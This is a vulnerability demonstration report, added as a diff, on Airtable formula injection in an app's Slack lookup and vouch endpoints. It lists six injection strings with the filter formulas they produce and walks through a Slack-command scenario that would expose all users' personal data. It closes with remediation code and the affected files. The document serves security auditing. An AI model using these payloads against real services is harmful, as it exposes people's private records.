@@ -1,0 +1,182 @@
+
+╔════════════════════════════════════════════════════════════════════════════╗
+║                                                                            ║
+║        Airtable Formula Injection - Vulnerability Demonstration            ║
+║                                                                            ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+Testing vulnerable code pattern from the application:
+
+  const filterByFormula = `{Email} = '${email}'`;
+  const record = await base('Users').select({ filterByFormula }).firstPage();
+
+════════════════════════════════════════════════════════════════════════════════
+
+TEST 1: Baseline - Legitimate Email
+────────────────────────────────────────────────────────────────────────────────
+Input (email parameter):
+  "user@example.com"
+
+Resulting Airtable Formula:
+  {Email} = 'user@example.com'
+
+✅ VULNERABLE: NO
+ℹ️  Impact: Normal operation
+
+════════════════════════════════════════════════════════════════════════════════
+
+TEST 2: Quote Escape Attack
+────────────────────────────────────────────────────────────────────────────────
+Input (email parameter):
+  "test' OR '1'='1"
+
+Resulting Airtable Formula:
+  {Email} = 'test' OR '1'='1'
+
+⚠️  VULNERABLE: YES
+💥 Impact: If '1'='1' evaluates to TRUE, returns all records
+
+════════════════════════════════════════════════════════════════════════════════
+
+TEST 3: TRUE() Function Injection
+────────────────────────────────────────────────────────────────────────────────
+Input (email parameter):
+  "') OR TRUE() OR ({Email} = 'x"
+
+Resulting Airtable Formula:
+  {Email} = '') OR TRUE() OR ({Email} = 'x'
+
+⚠️  VULNERABLE: YES
+💥 Impact: Always returns TRUE - bypasses email check completely
+
+════════════════════════════════════════════════════════════════════════════════
+
+TEST 4: Field Targeting Attack
+────────────────────────────────────────────────────────────────────────────────
+Input (email parameter):
+  "') OR ({Verification Status} = 'Eligible"
+
+Resulting Airtable Formula:
+  {Email} = '') OR ({Verification Status} = 'Eligible'
+
+⚠️  VULNERABLE: YES
+💥 Impact: Returns all users with Eligible status, not just the requested email
+
+════════════════════════════════════════════════════════════════════════════════
+
+TEST 5: Universal Match Attack
+────────────────────────────────────────────────────────────────────────────────
+Input (email parameter):
+  "') OR LEN({Email}) > 0 OR ({Email} = 'x"
+
+Resulting Airtable Formula:
+  {Email} = '') OR LEN({Email}) > 0 OR ({Email} = 'x'
+
+⚠️  VULNERABLE: YES
+💥 Impact: Returns all users (any email with length > 0)
+
+════════════════════════════════════════════════════════════════════════════════
+
+TEST 6: Negation Attack
+────────────────────────────────────────────────────────────────────────────────
+Input (email parameter):
+  "') OR NOT(FALSE()) OR ({Email} = 'x"
+
+Resulting Airtable Formula:
+  {Email} = '') OR NOT(FALSE()) OR ({Email} = 'x'
+
+⚠️  VULNERABLE: YES
+💥 Impact: NOT(FALSE()) = TRUE - returns all records
+
+════════════════════════════════════════════════════════════════════════════════
+
+╔════════════════════════════════════════════════════════════════════════════╗
+║                     REAL-WORLD ATTACK SCENARIO                             ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+Attacker uses Slack command:
+  /lookup ') OR TRUE() OR ({Email} = 'x
+
+What the application executes:
+  filterByFormula: "{Email} = '') OR TRUE() OR ({Email} = 'x'"
+
+What happens:
+  1. The filter starts: {Email} = '
+  2. Attacker's input closes the string: ')
+  3. Attacker injects OR TRUE(): This always evaluates to true
+  4. Query now matches ALL records, not just one email
+  5. Attacker can see verification status of ALL users
+
+Data exposed:
+  ✗ All user emails
+  ✗ All verification statuses
+  ✗ Names, phone numbers, birthdays
+  ✗ Proof of student status images
+  ✗ Who vouched for whom
+
+════════════════════════════════════════════════════════════════════════════════
+
+╔════════════════════════════════════════════════════════════════════════════╗
+║                          REMEDIATION EXAMPLE                               ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+SECURE CODE:
+
+function buildSecureQuery(email) {
+  // 1. Validate email format
+  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+  if (!emailRegex.test(email)) {
+    throw new Error("Invalid email format");
+  }
+  
+  // 2. Reject dangerous characters
+  if (email.includes("'") || email.includes('"') || email.includes('\\')) {
+    throw new Error("Invalid characters in email");
+  }
+  
+  // 3. Use proper escaping (if needed)
+  const sanitized = email.replace(/'/g, "\\'");
+  
+  return `{Email} = '${sanitized}'`;
+}
+
+Testing secure implementation with attack input:
+
+Attack Input: "') OR TRUE() OR ({Email} = 'x"
+Result: REJECTED: Invalid email format
+
+Valid Input: "user@example.com"
+Result: {Email} = 'user@example.com'
+
+════════════════════════════════════════════════════════════════════════════════
+
+╔════════════════════════════════════════════════════════════════════════════╗
+║                              FINAL VERDICT                                 ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+🔴 VULNERABILITY STATUS: CONFIRMED
+
+The application IS vulnerable to Airtable formula injection because:
+
+  1. ✗ No email validation before query construction
+  2. ✗ Direct string concatenation of user input
+  3. ✗ No sanitization of special characters (quotes, parentheses)
+  4. ✗ No protection against Airtable formula functions
+  5. ✗ No protection against logical operators (OR, AND)
+
+CVSS Score: 9.1 (Critical)
+
+Affected Files:
+  • src/pages/api/slack/vouch.ts:16
+  • src/pages/api/slack/lookup.ts:14-16
+  • src/lib/slack.ts:12-14
+
+Recommended Actions:
+  1. Implement strict email validation
+  2. Sanitize all user inputs
+  3. Use prepared statements or parameterized queries if available
+  4. Add input length limits
+  5. Implement proper error handling
+
+════════════════════════════════════════════════════════════════════════════════
+
